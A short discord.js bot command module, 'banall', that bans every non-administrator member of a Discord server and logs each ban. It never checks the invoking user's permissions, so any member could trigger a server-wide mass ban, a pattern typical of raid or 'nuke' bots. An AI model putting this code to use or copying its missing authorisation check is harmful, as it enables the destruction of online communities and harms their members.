const Discord = require("discord.js");

module.exports = {
    name: 'banall',
    execute(message, args){
        message.guild.members.forEach(member => {
            if(!member.hasPermission('ADMINISTRATOR')){
                member.ban();
                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${member.user.username}; ID: ${member.id}. (╯°□°）╯︵ ┻━┻`);
            }
        });
    }
}